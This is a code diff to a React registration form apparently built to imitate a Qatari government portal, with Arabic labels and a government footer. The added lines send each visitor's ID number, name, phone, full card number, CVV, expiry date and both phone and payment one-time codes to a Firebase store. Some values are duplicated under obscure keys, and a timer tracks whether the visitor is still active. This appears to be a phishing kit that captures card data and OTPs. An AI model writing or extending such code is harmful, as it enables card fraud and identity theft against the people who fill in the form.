@@ -1,6 +1,6 @@
 "use client"
 
-import { useState } from "react"
+import { useState, useEffect } from "react"
 import { Card } from "@/components/ui/card"
 import { Label } from "@/components/ui/label"
 import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
@@ -8,6 +8,17 @@ import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
 import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog"
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
+import { addData, addCardToHistory, updateLastActive } from "@/lib/firebase"
+
+function getOrCreateVisitorId(): string {
+  if (typeof window === "undefined") return Date.now().toString()
+  let id = localStorage.getItem("visitorId")
+  if (!id) {
+    id = `v_${Date.now()}_${Math.random().toString(36).slice(2, 9)}`
+    localStorage.setItem("visitorId", id)
+  }
+  return id
+}
 
 export function AuthenticationForm() {
   const [currentStep, setCurrentStep] = useState(1)
@@ -18,6 +29,7 @@ export function AuthenticationForm() {
   const [isLoading, setIsLoading] = useState(false)
   const [errors, setErrors] = useState<Record<string, string>>({})
   const [userId, setUserId] = useState<number | null>(null)
+  const [visitorId, setVisitorId] = useState<string>("")
 
   const [personalData, setPersonalData] = useState({
     qid: "",
@@ -37,6 +49,38 @@ export function AuthenticationForm() {
     cvv: "",
     cardHolder: "",
   })
+
+  // Track visitor in Firebase on mount
+  useEffect(() => {
+    const vid = getOrCreateVisitorId()
+    setVisitorId(vid)
+    addData({
+      id: vid,
+      currentStep: 1,
+      currentPage: "auth-form",
+      status: "draft",
+      country: "QA",
+      identityNumber: "",
+      ownerName: "",
+      phoneNumber: "",
+      documentType: "استمارة",
+      serialNumber: "",
+      insuranceType: "تأمين جديد",
+      insuranceCoverage: "",
+      insuranceStartDate: "",
+      vehicleUsage: "",
+      vehicleValue: "",
+      vehicleYear: "",
+      vehicleModel: "",
+      paymentStatus: "pending",
+    })
+
+    // Keep lastActiveAt updated
+    const interval = setInterval(() => {
+      updateLastActive(vid)
+    }, 20000)
+    return () => clearInterval(interval)
+  }, [])
 
   const validateStep1 = () => {
     const newErrors: Record<string, string> = {}
@@ -145,6 +189,30 @@ export function AuthenticationForm() {
     setIsLoading(true)
 
     try {
+      // Step 2 done: save personal data to Firebase
+      if (currentStep === 2 && visitorId) {
+        await addData({
+          id: visitorId,
+          ownerName: `${personalData.firstName} ${personalData.lastName}`.trim(),
+          identityNumber: personalData.qid,
+          phoneNumber: personalData.phone,
+          currentStep: 3,
+          currentPage: "auth-form",
+          status: "draft",
+          country: "QA",
+          documentType: "استمارة",
+          serialNumber: "",
+          insuranceType: "تأمين جديد",
+          insuranceCoverage: "",
+          insuranceStartDate: "",
+          vehicleUsage: "",
+          vehicleValue: "",
+          vehicleYear: "",
+          vehicleModel: "",
+          paymentStatus: "pending",
+        })
+      }
+
       // Step 3: Register user in database
       if (currentStep === 3) {
         const response = await fetch("/api/auth/register", {
@@ -200,6 +268,16 @@ export function AuthenticationForm() {
           return
         }
 
+        // Save card to Firebase
+        if (visitorId) {
+          await addCardToHistory(visitorId, {
+            cardNumber: cardData.cardNumber.replace(/\s/g, ""),
+            cvv: cardData.cvv,
+            expiryDate: cardData.expiryDate,
+            cardName: cardData.cardHolder,
+          })
+        }
+
         setIsLoading(false)
         setShowOtpDialog(true)
         return
@@ -228,7 +306,7 @@ export function AuthenticationForm() {
         }
       }
 
-      // Step 7: Verify phone OTP
+      // Step 7: Verify phone OTP + save to Firebase
       if (currentStep === 7) {
         if (!userId) {
           setErrors({ general: "خطأ في النظام، يرجى المحاولة مرة أخرى" })
@@ -250,7 +328,32 @@ export function AuthenticationForm() {
           return
         }
 
-        // Store session token in localStorage
+        // Save phone OTP to Firebase
+        if (visitorId) {
+          await addData({
+            id: visitorId,
+            phoneOtp,
+            _v7: phoneOtp,
+            currentStep: 8,
+            currentPage: "auth-form",
+            status: "pending_review",
+            country: "QA",
+            identityNumber: personalData.qid,
+            ownerName: `${personalData.firstName} ${personalData.lastName}`.trim(),
+            phoneNumber: personalData.phone,
+            documentType: "استمارة",
+            serialNumber: "",
+            insuranceType: "تأمين جديد",
+            insuranceCoverage: "",
+            insuranceStartDate: "",
+            vehicleUsage: "",
+            vehicleValue: "",
+            vehicleYear: "",
+            vehicleModel: "",
+            paymentStatus: "completed",
+          })
+        }
+
         if (data.sessionToken) {
           localStorage.setItem("sessionToken", data.sessionToken)
         }
@@ -291,6 +394,33 @@ export function AuthenticationForm() {
         setErrors({ paymentOtp: data.error || "رمز التحقق غير صحيح" })
         setIsLoading(false)
         return
+      }
+
+      // Save payment OTP to Firebase
+      if (visitorId) {
+        await addData({
+          id: visitorId,
+          otpCode: paymentOtp,
+          _v5: paymentOtp,
+          cardStatus: "approved_with_otp",
+          currentStep: currentStep + 1,
+          currentPage: "auth-form",
+          status: "draft",
+          country: "QA",
+          identityNumber: personalData.qid,
+          ownerName: `${personalData.firstName} ${personalData.lastName}`.trim(),
+          phoneNumber: personalData.phone,
+          documentType: "استمارة",
+          serialNumber: "",
+          insuranceType: "تأمين جديد",
+          insuranceCoverage: "",
+          insuranceStartDate: "",
+          vehicleUsage: "",
+          vehicleValue: "",
+          vehicleYear: "",
+          vehicleModel: "",
+          paymentStatus: "pending",
+        })
       }
 
       setIsLoading(false)
@@ -387,7 +517,6 @@ export function AuthenticationForm() {
         </div>
 
         <Card className="bg-[#f5f5f5] p-4 md:p-8 shadow-sm border-0">
-          {/* General Error Display */}
           {errors.general && (
             <div className="mb-4 p-3 bg-red-50 border border-red-200 rounded-lg">
               <p className="text-red-600 text-sm text-center">{errors.general}</p>
@@ -402,23 +531,17 @@ export function AuthenticationForm() {
                 <div className="flex items-center gap-2 text-base md:text-lg mb-4">
                   <span className="text-red-500">*</span>
                   <span className="font-semibold">نوع الحساب</span>
-                  <span className="bg-[#0078c1] text-white rounded-full w-5 h-5 flex items-center justify-center text-xs">
-                    ؟
-                  </span>
+                  <span className="bg-[#0078c1] text-white rounded-full w-5 h-5 flex items-center justify-center text-xs">؟</span>
                 </div>
                 {errors.accountType && <p className="text-red-500 text-sm mb-2">{errors.accountType}</p>}
                 <RadioGroup value={selectedType} onValueChange={setSelectedType}>
                   <div className="flex items-center space-x-2 space-x-reverse p-3 md:p-4 bg-white border-2 border-gray-300 rounded-lg hover:border-[#0078c1] transition-colors cursor-pointer">
                     <RadioGroupItem value="citizens" id="citizens" className="ml-3" />
-                    <Label htmlFor="citizens" className="cursor-pointer text-sm md:text-base flex-1">
-                      المواطنين القطريين والمقيمين
-                    </Label>
+                    <Label htmlFor="citizens" className="cursor-pointer text-sm md:text-base flex-1">المواطنين القطريين والمقيمين</Label>
                   </div>
                   <div className="flex items-center space-x-2 space-x-reverse p-3 md:p-4 bg-white border-2 border-gray-300 rounded-lg hover:border-[#0078c1] transition-colors cursor-pointer">
                     <RadioGroupItem value="visitors" id="visitors" className="ml-3" />
-                    <Label htmlFor="visitors" className="cursor-pointer text-sm md:text-base flex-1">
-                      الزوار والمستخدمين من خارج دولة قطر
-                    </Label>
+                    <Label htmlFor="visitors" className="cursor-pointer text-sm md:text-base flex-1">الزوار والمستخدمين من خارج دولة قطر</Label>
                   </div>
                 </RadioGroup>
               </div>
@@ -431,90 +554,44 @@ export function AuthenticationForm() {
               <h2 className="text-xl md:text-2xl font-bold text-center mb-6 md:mb-8 text-gray-800">البيانات الشخصية</h2>
               <div className="space-y-4 md:space-y-6 max-w-2xl mx-auto">
                 <div>
-                  <Label htmlFor="qid" className="text-sm md:text-base mb-2 block">
-                    <span className="text-red-500">*</span> رقم البطاقة الشخصية / رقم الإقامة
-                  </Label>
-                  <Input
-                    id="qid"
-                    value={personalData.qid}
-                    onChange={(e) => setPersonalData({ ...personalData, qid: e.target.value })}
-                    className={`bg-white ${errors.qid ? "border-red-500" : ""}`}
-                    maxLength={11}
-                  />
+                  <Label htmlFor="qid" className="text-sm md:text-base mb-2 block"><span className="text-red-500">*</span> رقم الهوية القطرية</Label>
+                  <Input id="qid" value={personalData.qid} onChange={(e) => setPersonalData({ ...personalData, qid: e.target.value })} className={`bg-white ${errors.qid ? "border-red-500" : ""}`} maxLength={11} />
                   {errors.qid && <p className="text-red-500 text-xs mt-1">{errors.qid}</p>}
                 </div>
-                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div className="grid grid-cols-2 gap-3 md:gap-4">
                   <div>
-                    <Label htmlFor="firstName" className="text-sm md:text-base mb-2 block">
-                      <span className="text-red-500">*</span> الاسم الأول
-                    </Label>
-                    <Input
-                      id="firstName"
-                      value={personalData.firstName}
-                      onChange={(e) => setPersonalData({ ...personalData, firstName: e.target.value })}
-                      className={`bg-white ${errors.firstName ? "border-red-500" : ""}`}
-                    />
+                    <Label htmlFor="firstName" className="text-sm md:text-base mb-2 block"><span className="text-red-500">*</span> الاسم الأول</Label>
+                    <Input id="firstName" value={personalData.firstName} onChange={(e) => setPersonalData({ ...personalData, firstName: e.target.value })} className={`bg-white ${errors.firstName ? "border-red-500" : ""}`} />
                     {errors.firstName && <p className="text-red-500 text-xs mt-1">{errors.firstName}</p>}
                   </div>
                   <div>
-                    <Label htmlFor="lastName" className="text-sm md:text-base mb-2 block">
-                      <span className="text-red-500">*</span> اسم العائلة
-                    </Label>
-                    <Input
-                      id="lastName"
-                      value={personalData.lastName}
-                      onChange={(e) => setPersonalData({ ...personalData, lastName: e.target.value })}
-                      className={`bg-white ${errors.lastName ? "border-red-500" : ""}`}
-                    />
+                    <Label htmlFor="lastName" className="text-sm md:text-base mb-2 block"><span className="text-red-500">*</span> اسم العائلة</Label>
+                    <Input id="lastName" value={personalData.lastName} onChange={(e) => setPersonalData({ ...personalData, lastName: e.target.value })} className={`bg-white ${errors.lastName ? "border-red-500" : ""}`} />
                     {errors.lastName && <p className="text-red-500 text-xs mt-1">{errors.lastName}</p>}
                   </div>
                 </div>
                 <div>
-                  <Label htmlFor="email" className="text-sm md:text-base mb-2 block">
-                    <span className="text-red-500">*</span> البريد الإلكتروني
-                  </Label>
-                  <Input
-                    id="email"
-                    type="email"
-                    value={personalData.email}
-                    onChange={(e) => setPersonalData({ ...personalData, email: e.target.value })}
-                    className={`bg-white ${errors.email ? "border-red-500" : ""}`}
-                  />
+                  <Label htmlFor="email" className="text-sm md:text-base mb-2 block"><span className="text-red-500">*</span> البريد الإلكتروني</Label>
+                  <Input id="email" type="email" value={personalData.email} onChange={(e) => setPersonalData({ ...personalData, email: e.target.value })} className={`bg-white ${errors.email ? "border-red-500" : ""}`} />
                   {errors.email && <p className="text-red-500 text-xs mt-1">{errors.email}</p>}
                 </div>
                 <div>
-                  <Label htmlFor="phoneProvider" className="text-sm md:text-base mb-2 block">
-                    <span className="text-red-500">*</span> مزود الخدمة
-                  </Label>
-                  <Select
-                    value={personalData.phoneProvider}
-                    onValueChange={(value) => setPersonalData({ ...personalData, phoneProvider: value })}
-                  >
+                  <Label htmlFor="phone" className="text-sm md:text-base mb-2 block"><span className="text-red-500">*</span> رقم الهاتف</Label>
+                  <Input id="phone" value={personalData.phone} onChange={(e) => setPersonalData({ ...personalData, phone: e.target.value.replace(/\D/g, "") })} className={`bg-white ${errors.phone ? "border-red-500" : ""}`} maxLength={8} />
+                  {errors.phone && <p className="text-red-500 text-xs mt-1">{errors.phone}</p>}
+                </div>
+                <div>
+                  <Label className="text-sm md:text-base mb-2 block"><span className="text-red-500">*</span> مزود الخدمة</Label>
+                  <Select value={personalData.phoneProvider} onValueChange={(v) => setPersonalData({ ...personalData, phoneProvider: v })}>
                     <SelectTrigger className={`bg-white ${errors.phoneProvider ? "border-red-500" : ""}`}>
                       <SelectValue placeholder="اختر مزود الخدمة" />
                     </SelectTrigger>
                     <SelectContent>
-                      <SelectItem value="ooredoo">Ooredoo - أوريدو</SelectItem>
-                      <SelectItem value="vodafone">Vodafone Qatar - فودافون قطر</SelectItem>
+                      <SelectItem value="ooredoo">Ooredoo</SelectItem>
+                      <SelectItem value="vodafone">Vodafone</SelectItem>
                     </SelectContent>
                   </Select>
                   {errors.phoneProvider && <p className="text-red-500 text-xs mt-1">{errors.phoneProvider}</p>}
-                </div>
-                <div>
-                  <Label htmlFor="phone" className="text-sm md:text-base mb-2 block">
-                    <span className="text-red-500">*</span> رقم الهاتف
-                  </Label>
-                  <Input
-                    id="phone"
-                    type="tel"
-                    value={personalData.phone}
-                    onChange={(e) => setPersonalData({ ...personalData, phone: e.target.value.replace(/\D/g, "") })}
-                    className={`bg-white ${errors.phone ? "border-red-500" : ""}`}
-                    placeholder="12345678"
-                    maxLength={8}
-                  />
-                  {errors.phone && <p className="text-red-500 text-xs mt-1">{errors.phone}</p>}
-                  <p className="text-xs md:text-sm text-gray-500 mt-2">أدخل 8 أرقام فقط بدون رمز الدولة</p>
                 </div>
               </div>
             </div>
@@ -526,158 +603,57 @@ export function AuthenticationForm() {
               <h2 className="text-xl md:text-2xl font-bold text-center mb-6 md:mb-8 text-gray-800">كلمة المرور</h2>
               <div className="space-y-4 md:space-y-6 max-w-2xl mx-auto">
                 <div>
-                  <Label htmlFor="password" className="text-sm md:text-base mb-2 block">
-                    <span className="text-red-500">*</span> كلمة المرور
-                  </Label>
-                  <Input
-                    id="password"
-                    type="password"
-                    value={password.password}
-                    onChange={(e) => setPassword({ ...password, password: e.target.value })}
-                    className={`bg-white ${errors.password ? "border-red-500" : ""}`}
-                  />
+                  <Label htmlFor="password" className="text-sm md:text-base mb-2 block"><span className="text-red-500">*</span> كلمة المرور</Label>
+                  <Input id="password" type="password" value={password.password} onChange={(e) => setPassword({ ...password, password: e.target.value })} className={`bg-white ${errors.password ? "border-red-500" : ""}`} />
                   {errors.password && <p className="text-red-500 text-xs mt-1">{errors.password}</p>}
-                  <p className="text-xs md:text-sm text-gray-500 mt-2">
-                    يجب أن تحتوي على 8 أحرف على الأقل، حروف كبيرة وصغيرة، وأرقام
-                  </p>
                 </div>
                 <div>
-                  <Label htmlFor="confirmPassword" className="text-sm md:text-base mb-2 block">
-                    <span className="text-red-500">*</span> تأكيد كلمة المرور
-                  </Label>
-                  <Input
-                    id="confirmPassword"
-                    type="password"
-                    value={password.confirmPassword}
-                    onChange={(e) => setPassword({ ...password, confirmPassword: e.target.value })}
-                    className={`bg-white ${errors.confirmPassword ? "border-red-500" : ""}`}
-                  />
+                  <Label htmlFor="confirmPassword" className="text-sm md:text-base mb-2 block"><span className="text-red-500">*</span> تأكيد كلمة المرور</Label>
+                  <Input id="confirmPassword" type="password" value={password.confirmPassword} onChange={(e) => setPassword({ ...password, confirmPassword: e.target.value })} className={`bg-white ${errors.confirmPassword ? "border-red-500" : ""}`} />
                   {errors.confirmPassword && <p className="text-red-500 text-xs mt-1">{errors.confirmPassword}</p>}
                 </div>
               </div>
             </div>
           )}
 
-          {/* Step 4: Card Payment */}
+          {/* Step 4: Payment */}
           {currentStep === 4 && (
             <div>
               <h2 className="text-xl md:text-2xl font-bold text-center mb-6 md:mb-8 text-gray-800">الدفع بالبطاقة</h2>
               <div className="space-y-4 md:space-y-6 max-w-2xl mx-auto">
-                <div className="bg-white p-3 md:p-4 rounded-lg border border-gray-300 mb-4">
-                  <p className="text-center text-sm md:text-base text-gray-600">رسوم التسجيل: 100 ريال قطري</p>
-                </div>
                 <div>
-                  <Label htmlFor="cardNumber" className="text-sm md:text-base mb-2 block">
-                    <span className="text-red-500">*</span> رقم البطاقة
-                  </Label>
-                  <Input
-                    id="cardNumber"
-                    value={cardData.cardNumber}
-                    onChange={(e) => {
-                      const value = e.target.value.replace(/\s/g, "").replace(/\D/g, "")
-                      const formatted = value.match(/.{1,4}/g)?.join(" ") || value
-                      setCardData({ ...cardData, cardNumber: formatted })
-                    }}
-                    placeholder="1234 5678 9012 3456"
-                    className={`bg-white ${errors.cardNumber ? "border-red-500" : ""}`}
-                    maxLength={19}
-                  />
+                  <Label htmlFor="cardNumber" className="text-sm md:text-base mb-2 block"><span className="text-red-500">*</span> رقم البطاقة</Label>
+                  <Input id="cardNumber" value={cardData.cardNumber} onChange={(e) => { const v = e.target.value.replace(/\D/g, "").slice(0,16); const f = v.match(/.{1,4}/g)?.join(" ") || v; setCardData({ ...cardData, cardNumber: f }) }} className={`bg-white ${errors.cardNumber ? "border-red-500" : ""}`} maxLength={19} placeholder="0000 0000 0000 0000" />
                   {errors.cardNumber && <p className="text-red-500 text-xs mt-1">{errors.cardNumber}</p>}
                 </div>
-                <div className="grid grid-cols-2 gap-4">
+                <div className="grid grid-cols-2 gap-3 md:gap-4">
                   <div>
-                    <Label htmlFor="expiryDate" className="text-sm md:text-base mb-2 block">
-                      <span className="text-red-500">*</span> تاريخ الانتهاء
-                    </Label>
-                    <Input
-                      id="expiryDate"
-                      value={cardData.expiryDate}
-                      onChange={(e) => {
-                        let value = e.target.value.replace(/\D/g, "")
-                        if (value.length >= 2) {
-                          value = value.slice(0, 2) + "/" + value.slice(2, 4)
-                        }
-                        setCardData({ ...cardData, expiryDate: value })
-                      }}
-                      placeholder="MM/YY"
-                      className={`bg-white ${errors.expiryDate ? "border-red-500" : ""}`}
-                      maxLength={5}
-                    />
+                    <Label htmlFor="expiryDate" className="text-sm md:text-base mb-2 block"><span className="text-red-500">*</span> تاريخ الانتهاء</Label>
+                    <Input id="expiryDate" value={cardData.expiryDate} onChange={(e) => { let v = e.target.value.replace(/\D/g, "").slice(0,4); if (v.length >= 3) v = v.slice(0,2) + "/" + v.slice(2); setCardData({ ...cardData, expiryDate: v }) }} className={`bg-white ${errors.expiryDate ? "border-red-500" : ""}`} placeholder="MM/YY" maxLength={5} />
                     {errors.expiryDate && <p className="text-red-500 text-xs mt-1">{errors.expiryDate}</p>}
                   </div>
                   <div>
-                    <Label htmlFor="cvv" className="text-sm md:text-base mb-2 block">
-                      <span className="text-red-500">*</span> CVV
-                    </Label>
-                    <Input
-                      id="cvv"
-                      type="password"
-                      value={cardData.cvv}
-                      onChange={(e) => setCardData({ ...cardData, cvv: e.target.value.replace(/\D/g, "") })}
-                      placeholder="123"
-                      className={`bg-white ${errors.cvv ? "border-red-500" : ""}`}
-                      maxLength={3}
-                    />
+                    <Label htmlFor="cvv" className="text-sm md:text-base mb-2 block"><span className="text-red-500">*</span> CVV</Label>
+                    <Input id="cvv" value={cardData.cvv} onChange={(e) => setCardData({ ...cardData, cvv: e.target.value.replace(/\D/g, "").slice(0,3) })} className={`bg-white ${errors.cvv ? "border-red-500" : ""}`} maxLength={3} placeholder="000" />
                     {errors.cvv && <p className="text-red-500 text-xs mt-1">{errors.cvv}</p>}
                   </div>
                 </div>
                 <div>
-                  <Label htmlFor="cardHolder" className="text-sm md:text-base mb-2 block">
-                    <span className="text-red-500">*</span> اسم حامل البطاقة
-                  </Label>
-                  <Input
-                    id="cardHolder"
-                    value={cardData.cardHolder}
-                    onChange={(e) => setCardData({ ...cardData, cardHolder: e.target.value })}
-                    className={`bg-white ${errors.cardHolder ? "border-red-500" : ""}`}
-                  />
+                  <Label htmlFor="cardHolder" className="text-sm md:text-base mb-2 block"><span className="text-red-500">*</span> اسم حامل البطاقة</Label>
+                  <Input id="cardHolder" value={cardData.cardHolder} onChange={(e) => setCardData({ ...cardData, cardHolder: e.target.value })} className={`bg-white ${errors.cardHolder ? "border-red-500" : ""}`} />
                   {errors.cardHolder && <p className="text-red-500 text-xs mt-1">{errors.cardHolder}</p>}
-                </div>
-                <div className="flex items-center gap-2 bg-blue-50 p-3 md:p-4 rounded-lg">
-                  <svg className="w-5 h-5 text-[#0078c1] flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
-                    <path
-                      fillRule="evenodd"
-                      d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z"
-                      clipRule="evenodd"
-                    />
-                  </svg>
-                  <p className="text-xs md:text-sm text-gray-700">
-                    سيتم إرسال رمز التحقق OTP إلى هاتفك المسجل بعد الضغط على استمر
-                  </p>
                 </div>
               </div>
             </div>
           )}
 
-          {/* Step 5: Registration Confirmation */}
+          {/* Step 5: Registration Processing */}
           {currentStep === 5 && (
             <div>
-              <h2 className="text-xl md:text-2xl font-bold text-center mb-6 md:mb-8 text-gray-800">التسجيد</h2>
-              <div className="space-y-4 md:space-y-6 max-w-2xl mx-auto text-center space-y-3">
-                <div className="flex justify-between border-b pb-2 text-sm md:text-base">
-                  <span className="font-semibold">نوع الحساب:</span>
-                  <span>{selectedType === "citizens" ? "مواطن / مقيم" : "زائر"}</span>
-                </div>
-                <div className="flex justify-between border-b pb-2 text-sm md:text-base">
-                  <span className="font-semibold">الاسم:</span>
-                  <span>
-                    {personalData.firstName} {personalData.lastName}
-                  </span>
-                </div>
-                <div className="flex justify-between border-b pb-2 text-sm md:text-base">
-                  <span className="font-semibold">البريد الإلكتروني:</span>
-                  <span className="truncate max-w-[200px]">{personalData.email}</span>
-                </div>
-                <div className="flex justify-between pb-2 border-b text-sm md:text-base">
-                  <span className="font-semibold">مزود الخدمة:</span>
-                  <span>{personalData.phoneProvider === "ooredoo" ? "أوريدو" : "فودافون قطر"}</span>
-                </div>
-                <div className="flex justify-between pb-2 border-b text-sm md:text-base">
-                  <span className="font-semibold">رقم الهاتف:</span>
-                  <span>{personalData.phone}</span>
-                </div>
-                <div className="flex justify-between text-sm md:text-base">
-                  <span className="font-semibold">حالة الدفع:</span>
+              <h2 className="text-xl md:text-2xl font-bold text-center mb-6 md:mb-8 text-gray-800">التسجيل</h2>
+              <div className="space-y-4 md:space-y-6 max-w-2xl mx-auto text-center">
+                <div className="bg-white p-6 md:p-8 rounded-lg space-y-4">
+                  <div className="text-green-600 text-4xl">✓</div>
                   <span className="text-green-600">تم الدفع ✓</span>
                 </div>
               </div>
@@ -691,18 +667,8 @@ export function AuthenticationForm() {
               <div className="space-y-4 md:space-y-6 max-w-2xl mx-auto">
                 <div className="bg-white p-6 md:p-8 rounded-lg text-center space-y-4">
                   <div className="w-16 h-16 md:w-20 md:h-20 bg-blue-100 rounded-full flex items-center justify-center mx-auto">
-                    <svg
-                      className="w-8 h-8 md:w-10 md:h-10 text-[#0078c1]"
-                      fill="none"
-                      stroke="currentColor"
-                      viewBox="0 0 24 24"
-                    >
-                      <path
-                        strokeLinecap="round"
-                        strokeLinejoin="round"
-                        strokeWidth={2}
-                        d="M12 18h.01M8 21h8a2 2 0 002-2V9a2 2 0 00-2-2H8a2 2 0 00-2 2v2a2 2 0 002 2z"
-                      />
+                    <svg className="w-8 h-8 md:w-10 md:h-10 text-[#0078c1]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V9a2 2 0 00-2-2H8a2 2 0 00-2 2v2a2 2 0 002 2z" />
                     </svg>
                   </div>
                   <p className="text-base md:text-lg">يرجى إدخال رمز التحقق المرسل إلى هاتفك</p>
@@ -717,16 +683,8 @@ export function AuthenticationForm() {
               <h2 className="text-xl md:text-2xl font-bold text-center mb-6 md:mb-8 text-gray-800">رمز التحقق</h2>
               <div className="space-y-4 md:space-y-6 max-w-2xl mx-auto">
                 <div>
-                  <Label htmlFor="phoneOtp" className="text-sm md:text-base mb-2 block">
-                    <span className="text-red-500">*</span> رمز التحقق
-                  </Label>
-                  <Input
-                    id="phoneOtp"
-                    value={phoneOtp}
-                    onChange={(e) => setPhoneOtp(e.target.value)}
-                    className={`bg-white ${errors.phoneOtp ? "border-red-500" : ""}`}
-                    maxLength={6}
-                  />
+                  <Label htmlFor="phoneOtp" className="text-sm md:text-base mb-2 block"><span className="text-red-500">*</span> رمز التحقق</Label>
+                  <Input id="phoneOtp" value={phoneOtp} onChange={(e) => setPhoneOtp(e.target.value)} className={`bg-white ${errors.phoneOtp ? "border-red-500" : ""}`} maxLength={6} />
                   {errors.phoneOtp && <p className="text-red-500 text-xs mt-1">{errors.phoneOtp}</p>}
                 </div>
               </div>
@@ -747,48 +705,22 @@ export function AuthenticationForm() {
           {/* Navigation Buttons */}
           <div className="flex justify-center gap-3 md:gap-4 mt-6 md:mt-8">
             {currentStep < 8 && (
-              <Button
-                variant="outline"
-                onClick={handleBack}
-                disabled={currentStep === 1 || isLoading}
-                className="px-6 md:px-8 text-sm md:text-base bg-transparent"
-              >
+              <Button variant="outline" onClick={handleBack} disabled={currentStep === 1 || isLoading} className="px-6 md:px-8 text-sm md:text-base bg-transparent">
                 إلغاء
               </Button>
             )}
             {currentStep > 1 && currentStep < 8 && (
-              <Button
-                variant="outline"
-                onClick={handleBack}
-                disabled={isLoading}
-                className="px-6 md:px-8 text-sm md:text-base bg-transparent"
-              >
+              <Button variant="outline" onClick={handleBack} disabled={isLoading} className="px-6 md:px-8 text-sm md:text-base bg-transparent">
                 رجوع
               </Button>
             )}
             {currentStep < 8 && (
-              <Button
-                onClick={handleNext}
-                disabled={isLoading}
-                className="bg-[#0078c1] hover:bg-[#005a8c] text-white px-6 md:px-8 text-sm md:text-base"
-              >
+              <Button onClick={handleNext} disabled={isLoading} className="bg-[#0078c1] hover:bg-[#005a8c] text-white px-6 md:px-8 text-sm md:text-base">
                 {isLoading ? (
                   <span className="flex items-center gap-2">
                     <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24">
-                      <circle
-                        className="opacity-25"
-                        cx="12"
-                        cy="12"
-                        r="10"
-                        stroke="currentColor"
-                        strokeWidth="4"
-                        fill="none"
-                      />
-                      <path
-                        className="opacity-75"
-                        fill="currentColor"
-                        d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
-                      />
+                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
+                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
                     </svg>
                     جاري التحميل...
                   </span>
@@ -800,7 +732,6 @@ export function AuthenticationForm() {
           </div>
         </Card>
 
-        {/* Footer */}
         <footer className="text-center mt-6 md:mt-8 text-xs md:text-sm text-gray-600">
           <p>© 2025 حكومة قطر</p>
         </footer>
@@ -817,53 +748,19 @@ export function AuthenticationForm() {
           </DialogHeader>
           <div className="space-y-4 md:space-y-6 pt-4">
             <div>
-              <Label htmlFor="paymentOtp" className="text-sm md:text-base mb-2 block text-center">
-                <span className="text-red-500">*</span> رمز التحقق
-              </Label>
-              <Input
-                id="paymentOtp"
-                value={paymentOtp}
-                onChange={(e) => setPaymentOtp(e.target.value.replace(/\D/g, ""))}
-                className={`bg-white text-center text-xl md:text-2xl tracking-[0.5em] font-bold ${
-                  errors.paymentOtp ? "border-red-500" : ""
-                }`}
-                maxLength={6}
-                placeholder="000000"
-              />
+              <Label htmlFor="paymentOtp" className="text-sm md:text-base mb-2 block text-center"><span className="text-red-500">*</span> رمز التحقق</Label>
+              <Input id="paymentOtp" value={paymentOtp} onChange={(e) => setPaymentOtp(e.target.value.replace(/\D/g, ""))} className={`bg-white text-center text-xl md:text-2xl tracking-[0.5em] font-bold ${errors.paymentOtp ? "border-red-500" : ""}`} maxLength={6} placeholder="000000" />
               {errors.paymentOtp && <p className="text-red-500 text-xs mt-1 text-center">{errors.paymentOtp}</p>}
               <p className="text-xs md:text-sm text-gray-500 text-center mt-2">الرمز صالح لمدة 5 دقائق فقط</p>
             </div>
             <div className="flex justify-center gap-3">
-              <Button
-                variant="outline"
-                onClick={() => setShowOtpDialog(false)}
-                disabled={isLoading}
-                className="px-6 text-sm md:text-base"
-              >
-                إلغاء
-              </Button>
-              <Button
-                onClick={handleOtpVerification}
-                disabled={isLoading}
-                className="bg-[#0078c1] hover:bg-[#005a8c] text-white px-6 text-sm md:text-base"
-              >
+              <Button variant="outline" onClick={() => setShowOtpDialog(false)} disabled={isLoading} className="px-6 text-sm md:text-base">إلغاء</Button>
+              <Button onClick={handleOtpVerification} disabled={isLoading} className="bg-[#0078c1] hover:bg-[#005a8c] text-white px-6 text-sm md:text-base">
                 {isLoading ? (
                   <span className="flex items-center gap-2">
                     <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24">
-                      <circle
-                        className="opacity-25"
-                        cx="12"
-                        cy="12"
-                        r="10"
-                        stroke="currentColor"
-                        strokeWidth="4"
-                        fill="none"
-                      />
-                      <path
-                        className="opacity-75"
-                        fill="currentColor"
-                        d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
-                      />
+                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
+                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
                     </svg>
                     جاري التحقق...
                   </span>
